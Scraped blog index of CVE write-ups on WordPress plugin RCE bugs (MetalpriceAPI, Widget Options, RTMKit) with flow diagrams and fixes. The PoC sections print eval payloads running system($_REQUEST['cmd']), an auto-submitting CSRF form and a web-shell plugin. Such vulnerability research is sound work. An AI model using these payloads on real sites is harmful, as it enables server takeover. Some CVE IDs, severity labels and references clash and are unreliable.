The Improper Control of Generation of Code (“Code Injection”) vulnerability in MetalpriceAPI allows Code Injection to be performed. This issue affects MetalpriceAPI from n/a up to version 1.1.4. CVE ID: CVE-2024-8672 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 1.1.4 Patched Versions: 1.1.5 CVSS severity: Medium (9.9) Required Privilege: Contributor Product: WordPress MetalpriceAPI Plugin ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – MetalpriceAPI: 1.1.4 – vulnerable 1.1.5 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v1.1.4): index.php v1.1.4 if (isset($attrs['operation'])) { $operation = $attrs['operation']; $operation = str_replace('(value)', $price, $operation); eval('$price = ' . $operation . ';'); } The value of $attrs['operation'] from the shortcode is directly concatenated into a PHP string and then passed to eval(). An attacker can inject arbitrary PHP code ⇒ RCE. Patched version (v1.1.5): index.php v1.1.5 if (isset($attrs['operation'])) { $price = $this-\u003esafe_math_eval($attrs['operation'], $price); } Instead of using eval(), a custom safe_math_eval function is used, completely eliminating the ability to execute system code. index.php v1.1.5 private function safe_math_eval($expression, $value) { // Remove any whitespace $expression = preg_replace('/\\s+/', '', $expression); // Only allow basic math operations, numbers, and the value keyword if (!preg_match('/^[0-9\\.\\+\\-\\*\\/\\(\\)value]+$/', $expression)) { return $value; } // Replace (value) with the actual value $expression = str_replace('(value)', $value, $expression); // Use a safe evaluation method try { // Split the expression into tokens $tokens = preg_split('/([\\+\\-\\*\\/\\(\\)])/', $expression, -1, PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY); // Convert to Reverse Polish Notation (RPN) $output = array(); $operators = array(); foreach ($tokens as $token) { if (is_numeric($token)) { $output[] = $token; } elseif ($token === '(') { $operators[] = $token; } elseif ($token === ')') { while (count($operators) \u003e 0 \u0026\u0026 end($operators) !== '(') { $output[] = array_pop($operators); } if (count($operators) \u003e 0 \u0026\u0026 end($operators) === '(') { array_pop($operators); } } else { $precedence = array( '+' =\u003e 1, '-' =\u003e 1, '*' =\u003e 2, '/' =\u003e 2 ); while (count($operators) \u003e 0 \u0026\u0026 end($operators) !== '(' \u0026\u0026 $precedence[$token] \u003c= $precedence[end($operators)]) { $output[] = array_pop($operators); } $operators[] = $token; } } while (count($operators) \u003e 0) { $output[] = array_pop($operators); } // Evaluate RPN $stack = array(); foreach ($output as $token) { if (is_numeric($token)) { array_push($stack, $token); } else { $b = array_pop($stack); $a = array_pop($stack); switch ($token) { case '+': array_push($stack, $a + $b); break; case '-': array_push($stack, $a - $b); break; case '*': array_push($stack, $a * $b); break; case '/': if ($b == 0) { return $value; // Division by zero } array_push($stack, $a / $b); break; } } } $result = array_pop($stack); return is_numeric($result) ? $result : $value; } catch (Exception $e) { return $value; } } ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers the metalpriceapi shortcode with the shortcode() callback: add_shortcode('metalpriceapi', [$this, 'shortcode']); Inside the shortcode() function, input parameters are retrieved from the shortcode using shortcode_atts(). The plugin then retrieves the saved api_key using get_option(), constructs the URL, and sends a request to https://api.metalpriceapi.com using wp_remote_get(). If an account is registered at metalpriceapi.com and the API key is entered in the plugin Settings: Enter API key The response will look like: The response body is decoded into an array using json_decode(). When the condition isset($json['success']) \u0026\u0026 $json['success'] == true is satisfied and the shortcode provides the operation parameter, the plugin executes: $operation = $attrs['operation']; $operation = str_replace('(value)', $price, $operation); eval('$price = ' . $operation . ';'); Here, the user-controlled operation value is passed directly into eval(), leading to arbitrary PHP code execution. This allows an attacker to inject and execute commands on the server via the operation parameter in the shortcode. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Attacker with Contributor (or higher) role\"] --\u003e B[\"Creates or edits a post/content\"] --\u003e C[\"Inserts [metalpriceapi operation=payload]\"] --\u003e D[\"WordPress renders the shortcode\"] --\u003e E[\"Plugin executes shortcode() function\"] --\u003e F[\"operation is concatenated into a PHP expression\"] --\u003e G[\"eval() executes the attacker‑controlled input\"] --\u003e H[\"Remote Code Execution (RCE) on the server\"] graph TD A[\"Attacker with Contributor (or higher) role\"] --\u003e B[\"Creates or edits a post/content\"] --\u003e C[\"Inserts [metalpriceapi operation=payload]\"] --\u003e D[\"WordPress renders the shortcode\"] --\u003e E[\"Plugin executes shortcode() function\"] --\u003e F[\"operation is concatenated into a PHP expression\"] --\u003e G[\"eval() executes the attacker‑controlled input\"] --\u003e H[\"Remote Code Execution (RCE) on the server\"] graph TD A[\"Attacker with Contributor (or higher) role\"] --\u003e B[\"Creates or edits a post/content\"] --\u003e C[\"Inserts [metalpriceapi operation=payload]\"] --\u003e D[\"WordPress renders the shortcode\"] --\u003e E[\"Plugin executes shortcode() function\"] --\u003e F[\"operation is concatenated into a PHP expression\"] --\u003e G[\"eval() executes the attacker‑controlled input\"] --\u003e H[\"Remote Code Execution (RCE) on the server\"] graph TD A[\"Attacker with Contributor (or higher) role\"] --\u003e B[\"Creates or edits a post/content\"] --\u003e C[\"Inserts [metalpriceapi operation=payload]\"] --\u003e D[\"WordPress renders the shortcode\"] --\u003e E[\"Plugin executes shortcode() function\"] --\u003e F[\"operation is concatenated into a PHP expression\"] --\u003e G[\"eval() executes the attacker‑controlled input\"] --\u003e H[\"Remote Code Execution (RCE) on the server\"] ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a post using a Contributor account Add the shortcode: [metalpriceapi operation='\"abc\";system($_REQUEST(\"cmd\"));die()'] Result ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2024-8672 in the WordPress MetalpriceAPI plugin (\u003c= 1.1.4) is a critical RCE vulnerability caused by directly using eval() with user-controlled input from the operation parameter in the shortcode. With only Contributor privileges, an attacker can inject and execute arbitrary PHP code on the server, leading to system compromise, data leakage, or malware installation. Version 1.1.5 fixed the issue by removing eval() and replacing it with a safer expression-handling function. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never use eval() with user-supplied input, even indirectly. WordPress shortcodes, if not properly controlled, can become an entry point for RCE. Always validate, sanitize, and strictly restrict allowed characters in input parameters. Use a parser or dedicated handler instead of directly executing dynamic expressions. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Remote Code Execution (RCE) WordPress MetalpriceAPI Plugin \u003c= 1.1.4 is vulnerable to PHP Object Injection ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Widget Options Plugin.","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Widget Options – The #1 WordPress Widget \u0026 Block Control Plugin for WordPress contains a Remote Code Execution vulnerability in all versions up to and including 4.0.7 via the display logic feature extended for multiple page builders, because the plugin allows input to pass through eval() without filtering or capability checks, allowing an authenticated attacker with contributor-level access or higher to execute code on the server; although it has been patched, the issue still leaves residual risk as it has not been fully hardened. CVE ID: CVE-2024-8672 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 4.0.7 Patched Versions: 4.0.8 CVSS severity: High (9.9) Required Privilege: Contributor Product: WordPress Widget Options Plugin ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Widget Options: 4.0.7 – vulnerable 4.1.3 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v4.0.7): extras.php v4.0.7 function widgetopts_safe_eval($expression) { ob_start(); try { $result = (bool) eval(\"return $expression;\"); } catch (Throwable $e) { return false; } ob_end_clean(); return $result; } The vulnerability originates from the widgetopts_safe_eval function, which allows execution of arbitrary commands via eval. Patched version (v4.1.3): extras.php v4.1.3 function widgetopts_safe_eval($expression) { if (widgetopts_is_widget_or_post_preview()) { // Always return true for previews unless the user is an administrator if (!current_user_can('administrator')) { return true; } } $validation_result = widgetopts_validate_expression($expression); if ($validation_result['valid'] === false) { return false; } if (stristr($expression, \"return\") === false) { $expression = \"return (\" . $expression . \");\"; } ob_start(); try { $result = (bool) (@eval($expression)); } catch (\\Exception $e) { $result = false; } catch (\\Error $e) { $result = false; } catch (\\ParseError $e) { $result = false; } catch (\\Throwable $e) { $result = false; } ob_end_clean(); return $result; } The patch validates $expression by calling the function widgetopts_validate_expression (https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534) ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis This plugin registers a filter hook on render_block: add_filter('render_block', function ($block_content, $parsed_block, $obj) { if (!is_admin()) { add_filter(\"render_block_{$obj-\u003ename}\", \"blockopts_filter_before_display\", 100, 3); } return $block_content; }, 100, 3); The render_block hook is triggered every time a block is rendered in the WordPress default editor (Gutenberg). If not in the admin environment (!is_admin()), the plugin attaches an additional filter for the current block (render_block_{block_name}) to process the content before displaying it, via the function blockopts_filter_before_display. gutenberg-toolbar.php v4.0.7 function blockopts_filter_before_display($block_content, $parsed_block, $obj) { ... if (isset($parsed_block) \u0026\u0026 isset($parsed_block['attrs']) \u0026\u0026 (isset($parsed_block['attrs']['extended_widget_opts']) || isset($parsed_block['attrs']['extended_widget_opts_block']))) { ... if ('activate' == $widget_options['logic']) { // display widget logic if (isset($opts['class']) \u0026\u0026 isset($opts['class']['logic']) \u0026\u0026 !empty($opts['class']['logic'])) { $display_logic = stripslashes(trim($opts['class']['logic'])); $display_logic = apply_filters('widget_options_logic_override_block', $display_logic); $display_logic = apply_filters('extended_widget_options_logic_override_block', $display_logic); if ($display_logic === false) { return false; } if ($display_logic === true) { return true; } // if (stristr($display_logic, \"return\") === false) { // $display_logic = \"return (\" . $display_logic . \");\"; // } $display_logic = htmlspecialchars_decode($display_logic, ENT_QUOTES); if (!widgetopts_safe_eval($display_logic)) { return false; } } } ... } } Line 4 checks whether Gutenberg Page \u0026 Post Block Options is enabled; we enable it in the Admin Dashboard. Enable Gutenberg Page \u0026 Post Block Options On line 6 and line 8, the code checks whether the logic field exists and is not empty. If this condition is met, the function widgetopts_safe_eval($display_logic) is called, resulting in the execution of any command passed into it. Logic field when submitting a post Here, when using a Contributor account to create a post, the logic field appears in the request with the value set as a payload. We can fully control this field. ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Attacker has a Contributor (or higher) account\"] --\u003e B[\"Creates or edits a post using Gutenberg\"] B --\u003e C[\"Inserts malicious PHP into the 'Logic' field (extended_widget_opts)\"] C --\u003e D[\"Payload is saved in block attributes\"] D --\u003e E[\"render_block hook is triggered\"] E --\u003e F[\"blockopts_filter_before_display() is executed\"] F --\u003e G[\"widgetopts_safe_eval() is called\"] G --\u003e H[\"eval() executes the attacker’s payload\"] H --\u003e I[\"Remote Code Execution on the server\"] graph TD A[\"Attacker has a Contributor (or higher) account\"] --\u003e B[\"Creates or edits a post using Gutenberg\"] B --\u003e C[\"Inserts malicious PHP into the 'Logic' field (extended_widget_opts)\"] C --\u003e D[\"Payload is saved in block attributes\"] D --\u003e E[\"render_block hook is triggered\"] E --\u003e F[\"blockopts_filter_before_display() is executed\"] F --\u003e G[\"widgetopts_safe_eval() is called\"] G --\u003e H[\"eval() executes the attacker’s payload\"] H --\u003e I[\"Remote Code Execution on the server\"] graph TD A[\"Attacker has a Contributor (or higher) account\"] --\u003e B[\"Creates or edits a post using Gutenberg\"] B --\u003e C[\"Inserts malicious PHP into the 'Logic' field (extended_widget_opts)\"] C --\u003e D[\"Payload is saved in block attributes\"] D --\u003e E[\"render_block hook is triggered\"] E --\u003e F[\"blockopts_filter_before_display() is executed\"] F --\u003e G[\"widgetopts_safe_eval() is called\"] G --\u003e H[\"eval() executes the attacker’s payload\"] H --\u003e I[\"Remote Code Execution on the server\"] graph TD A[\"Attacker has a Contributor (or higher) account\"] --\u003e B[\"Creates or edits a post using Gutenberg\"] B --\u003e C[\"Inserts malicious PHP into the 'Logic' field (extended_widget_opts)\"] C --\u003e D[\"Payload is saved in block attributes\"] D --\u003e E[\"render_block hook is triggered\"] E --\u003e F[\"blockopts_filter_before_display() is executed\"] F --\u003e G[\"widgetopts_safe_eval() is called\"] G --\u003e H[\"eval() executes the attacker’s payload\"] H --\u003e I[\"Remote Code Execution on the server\"] ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Using an Administrator account, enable the option Gutenberg Page \u0026 Post Block Options Create a post with a Contributor account: POST /index.php/wp-json/wp/v2/posts/170?_locale=user\u0026cmd=ls+/ HTTP/1.1 Host: localhost ... {\"id\":170,\"title\":\"testing\",\"content\":\"\u003c!-- wp:paragraph {\\\"atts\\\":{\\\"id_base\\\":-1,\\\"column\\\":{\\\"desktop\\\":\\\"12\\\",\\\"tablet\\\":\\\"12\\\",\\\"mobile\\\":\\\"12\\\"},\\\"alignment\\\":{\\\"desktop\\\":\\\"default\\\",\\\"tablet\\\":\\\"default\\\",\\\"mobile\\\":\\\"default\\\"},\\\"roles\\\":{\\\"state\\\":\\\"\\\",\\\"options\\\":\\\"hide\\\"},\\\"visibility\\\":{\\\"selected\\\":\\\"0\\\",\\\"options\\\":\\\"hide\\\",\\\"acf\\\":{\\\"visibility\\\":\\\"hide\\\",\\\"field\\\":\\\"\\\",\\\"condition\\\":\\\"\\\",\\\"value\\\":\\\"\\\"}},\\\"author_page\\\":{\\\"author_pages\\\":{\\\"selections\\\":\\\"1\\\"}},\\\"devices\\\":{\\\"options\\\":\\\"hide\\\"},\\\"days\\\":{\\\"options\\\":\\\"hide\\\"},\\\"dates\\\":{\\\"options\\\":\\\"hide\\\",\\\"from\\\":\\\"\\\",\\\"to\\\":\\\"\\\"},\\\"styling\\\":{\\\"selected\\\":\\\"0\\\",\\\"bg_image\\\":\\\"\\\",\\\"background\\\":\\\"\\\",\\\"background_hover\\\":\\\"\\\",\\\"heading\\\":\\\"\\\",\\\"text\\\":\\\"\\\",\\\"links\\\":\\\"\\\",\\\"links_hover\\\":\\\"\\\",\\\"border_color\\\":\\\"\\\",\\\"border_type\\\":\\\"\\\",\\\"border_width\\\":\\\"\\\",\\\"background_input\\\":\\\"\\\",\\\"text_input\\\":\\\"\\\",\\\"border_color_input\\\":\\\"\\\",\\\"border_type_input\\\":\\\"\\\",\\\"border_width_input\\\":\\\"\\\",\\\"background_submit\\\":\\\"\\\",\\\"background_submit_hover\\\":\\\"\\\",\\\"text_submit\\\":\\\"\\\",\\\"border_color_submit\\\":\\\"\\\",\\\"border_type_submit\\\":\\\"\\\",\\\"border_width_submit\\\":\\\"\\\",\\\"list_border_color\\\":\\\"\\\",\\\"table_border_color\\\":\\\"\\\"},\\\"class\\\":{\\\"selected\\\":\\\"0\\\",\\\"link\\\":\\\"\\\",\\\"id\\\":\\\"a\\\",\\\"classes\\\":\\\"\\\",\\\"animation\\\":\\\"\\\",\\\"event\\\":\\\"enters\\\",\\\"speed\\\":\\\"\\\",\\\"offset\\\":\\\"\\\",\\\"delay\\\":\\\"\\\",\\\"logic\\\":\\\"system($_REQUEST[\\\"cmd\\\"])\\\"},\\\"tabselect\\\":\\\"0\\\"},\\\"dateUpdated\\\":123} --\u003e\\n\u003cp\u003ePayload\u003c/p\u003e\\n\u003c!-- /wp:paragraph --\u003e\",\"status\":\"pending\"} Result ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in Widget Options \u003c= 4.0.7 stems from the unsafe use of eval() in the display logic feature. User-controlled data from the block attribute extended_widget_opts is passed directly into the widgetopts_safe_eval() function without proper validation, filtering, or sanitization. This allows an authenticated attacker with Contributor (or higher) privileges to inject and execute arbitrary PHP code during block rendering, leading to Remote Code Execution (RCE) on the server. Although later versions introduced expression validation, the root cause still lies in trusting unfiltered logic input and allowing dynamic execution through eval(). ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never pass user-controlled data into eval(), even in “logic” or conditional features. All block / widget attributes must be strictly validated and sanitized before use. Contributor-level privileges can still be extremely dangerous when combined with unsafe server-side code execution mechanisms. Avoid dynamic code execution; instead, use a safe parser or a whitelist of valid expressions. ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Remote Code Execution (RCE) WordPress Widget Options Plugin \u003c= 4.0.7 is vulnerable to PHP Object Injection ","date":"2025-12-04","objectID":"/posts/2025-12-04-cve-2024-8672/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 PoC","uri":"/posts/2025-12-04-cve-2024-8672/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress RTMKit Plugin.","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Improper Control of Generation of Code (‘Code Injection’) vulnerability in Rometheme RomethemeKit For Elementor allows Command Injection to occur. This issue affects RomethemeKit For Elementor from n/a up to version 1.5.4. CVE ID: CVE-2025-30911 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 1.5.4 Patched Versions: 1.5.5 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress RTMKit Plugin ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - RTMKit: 1.5.3 – vulnerable 1.5.5 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause Note Although the vulnerability was reported as affecting up to version 1.5.4, it was actually partially patched in that version, so I chose version 1.5.3 for the analysis. In the vulnerable version (v1.5.3): template.php v1.5.3 public function install_requirements() { include_once ABSPATH . 'wp-admin/includes/plugin.php'; include_once ABSPATH . 'wp-admin/includes/file.php'; include_once ABSPATH . 'wp-admin/includes/misc.php'; include_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php'; $plugin = $_POST['plugin']; $plugin_file = WP_PLUGIN_DIR . '/' . $plugin; $plugin_slug = dirname($plugin); if (file_exists($plugin_file)) { // Activate the plugin if already installed but inactive ob_start(); activate_plugin($plugin); ob_clean(); ob_end_clean(); wp_send_json_success(\"Install and Activate Successfully\"); } else { ob_start(); $plugin_download_url = \"https://downloads.wordpress.org/plugin/{$plugin_slug}.latest-stable.zip\"; // Adjust URL structure $upgrader = new \\Plugin_Upgrader(); $result = $upgrader-\u003einstall($plugin_download_url); if (is_wp_error($result)) { wp_send_json_error(); } $activate_result = activate_plugin($plugin); if (is_wp_error($activate_result)) { wp_send_json_error('Plugin installed but failed to activate: ' . $activate_result-\u003eget_error_message()); } wp_send_json_success('Plugin installed and activated successfully.'); } } The install_requirements() function allows downloading and activating a plugin based on the value of $_POST['plugin']: If the plugin is already downloaded but not activated, it will be activated: if (file_exists($plugin_file)) { // Activate the plugin if already installed but inactive ob_start(); activate_plugin($plugin); ob_clean(); ob_end_clean(); wp_send_json_success(\"Install and Activate Successfully\"); } If the plugin is not yet downloaded, it will be downloaded. However, this function does not perform any user privilege validation. In version v1.5.4, the developer partially fixed the issue by adding: template.php v1.5.4 if (!current_user_can('manage_options')) { wp_die(); } manage_options is a capability reserved for Administrators, so only Admin accounts can now call this function. This prevents normal users (Subscriber, Author, etc.) and unauthenticated users from directly exploiting the vulnerability. However, this patch is still not sufficient. Why? Although the function is restricted to Administrators, there is no CSRF (Cross-Site Request Forgery) protection. This means that: If an Administrator is logged into the WordPress website and visits a malicious website controlled by an attacker, that website can silently send a (POST) request to install_requirements. The request will be executed with Administrator privileges because the browser automatically includes the authenticated cookies. In version v1.5.5, the vulnerability was finally and properly patched by adding a nonce verification: if (!isset($_POST['wpnonce']) || !wp_verify_nonce($_POST['wpnonce'], 'rtm_template_nonce')) { wp_send_json_error('Access Denied'); wp_die(); } By combining both protection layers: current_user_can('manage_options') → privilege check wp_verify_nonce() → CSRF protection the vulnerability was correctly mitigated. ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an AJAX action for authenticated users (wp_ajax_): add_action('wp_ajax_install_requirements', [$this, 'install_requirements']); When accessing the endpoint /wp-admin/admin-ajax.php with action=install_requirements, the install_requirements callback is executed. ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Administrator is logged in to the WordPress site\"] --\u003e B[\"Administrator visits a malicious website controlled by the attacker\"] B --\u003e C[\"Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements\"] C --\u003e D[\"Browser automatically includes Administrator cookies\"] D --\u003e E[\"WordPress treats the request as coming from an authenticated Admin\"] E --\u003e F[\"install_requirements() is executed without nonce validation\"] F --\u003e G[\"Untrusted $_POST['plugin'] is processed\"] G --\u003e H[\"Plugin_Upgrader-\u003einstall()\"] H --\u003e I[\"activate_plugin()\"] I --\u003e J[\"Malicious plugin is installed and activated\"] graph TD A[\"Administrator is logged in to the WordPress site\"] --\u003e B[\"Administrator visits a malicious website controlled by the attacker\"] B --\u003e C[\"Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements\"] C --\u003e D[\"Browser automatically includes Administrator cookies\"] D --\u003e E[\"WordPress treats the request as coming from an authenticated Admin\"] E --\u003e F[\"install_requirements() is executed without nonce validation\"] F --\u003e G[\"Untrusted $_POST['plugin'] is processed\"] G --\u003e H[\"Plugin_Upgrader-\u003einstall()\"] H --\u003e I[\"activate_plugin()\"] I --\u003e J[\"Malicious plugin is installed and activated\"] graph TD A[\"Administrator is logged in to the WordPress site\"] --\u003e B[\"Administrator visits a malicious website controlled by the attacker\"] B --\u003e C[\"Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements\"] C --\u003e D[\"Browser automatically includes Administrator cookies\"] D --\u003e E[\"WordPress treats the request as coming from an authenticated Admin\"] E --\u003e F[\"install_requirements() is executed without nonce validation\"] F --\u003e G[\"Untrusted $_POST['plugin'] is processed\"] G --\u003e H[\"Plugin_Upgrader-\u003einstall()\"] H --\u003e I[\"activate_plugin()\"] I --\u003e J[\"Malicious plugin is installed and activated\"] graph TD A[\"Administrator is logged in to the WordPress site\"] --\u003e B[\"Administrator visits a malicious website controlled by the attacker\"] B --\u003e C[\"Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements\"] C --\u003e D[\"Browser automatically includes Administrator cookies\"] D --\u003e E[\"WordPress treats the request as coming from an authenticated Admin\"] E --\u003e F[\"install_requirements() is executed without nonce validation\"] F --\u003e G[\"Untrusted $_POST['plugin'] is processed\"] G --\u003e H[\"Plugin_Upgrader-\u003einstall()\"] H --\u003e I[\"activate_plugin()\"] I --\u003e J[\"Malicious plugin is installed and activated\"] ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a website containing the payload and send it to the Administrator: payload \u003chtml\u003e \u003cbody\u003e \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"install\u0026#95;requirements\" /\u003e \u003cinput type=\"hidden\" name=\"plugin\" value=\"malicious\u0026#95;plugin\u0026#47;malicious\u0026#95;plugin\u0026#95;dir\u0026#46;php\" /\u003e \u003cinput type=\"submit\" value=\"Submit request\" /\u003e \u003c/form\u003e \u003cscript\u003e history.pushState('', '', '/'); document.forms[0].submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e When the Administrator visits the page, the plugin will be activated. Example plugin: if (!defined('ABSPATH')) { exit; } add_action('init', function () { if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); } }); Trigger RCE Result ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in RTMKit \u003c= 1.5.4 lies in the install_requirements() function, where the value of $_POST['plugin'] is processed directly to install and activate a plugin without sufficient validation. Version 1.5.4 introduced a permission check using current_user_can('manage_options'), but still lacked CSRF protection, allowing an attacker to abuse a logged-in Administrator to send a hidden request and install a malicious plugin. It was only in v1.5.5 that the addition of wp_verify_nonce() fully addressed the issue and prevented the risk of RCE. ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 